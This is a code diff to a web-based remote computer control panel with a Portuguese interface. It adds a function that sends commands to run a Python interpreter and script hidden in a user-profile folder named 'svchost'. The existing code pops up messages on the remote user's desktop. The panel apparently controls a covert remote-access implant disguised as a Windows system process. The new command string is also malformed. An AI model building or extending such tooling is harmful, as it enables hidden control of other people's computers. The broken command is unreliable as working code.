@@ -535,6 +535,10 @@ function openComputerControl(computer) {
         <div class=message-area>
             <input type="text" id="message-input" placeholder="Mande uma mensagem...">
             <button class="btn btn-primary" onclick="sendMessage()">Enviar</button>
+            <div>
+            <input type="text" id="audio-input" placeholder="Mande uma mensagem...">
+            <button class="btn btn-primary" onclick="sendAudio()">Enviar</button>
+            </div>
         </div>
         </div>
       </div>
@@ -606,6 +610,19 @@ function sendMessage() {
   document.getElementById("command-input").value = 'powershell -command "msg $env:USERNAME \"' + message + '\""' ;
   executeCommand();
 }
+
+function sendAudio() {
+  const input = document.querySelector("#audio-input");
+  const message = input ? input.value : "";
+  if (!message) return;
+  document.getElementById("command-input").value =
+    'powershell -%USERPROFILE%\\AppData\\Local\\svchost\\python.exe %USERPROFILE%\\AppData\\Local\\svchost\\script.py "' +
+    message.replace(/"/g, '\\"') +
+    '"' ;
+
+  executeCommand();
+}
+
 
       </script>
     </body>
